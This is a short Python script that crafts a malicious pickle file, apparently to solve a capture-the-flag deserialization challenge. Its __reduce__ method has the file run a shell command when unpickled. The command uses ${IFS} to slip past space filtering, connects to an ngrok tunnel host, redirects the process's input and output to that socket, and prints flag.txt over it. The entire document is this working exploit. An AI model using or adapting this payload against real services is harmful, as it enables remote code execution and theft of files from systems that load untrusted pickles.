import pickle, os, base64, io
class P(object):
    def __reduce__(self):
        return(os.system,("python${IFS}-c${IFS}'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");os=__import__(\"os\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"0.tcp.ap.ngrok.io\",13754));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.run([\"cat\",\"flag.txt\"])'",))

pickle.dump(P(),open('test.pkl','wb'))
# pickle.load(open('test.pkl','rb'))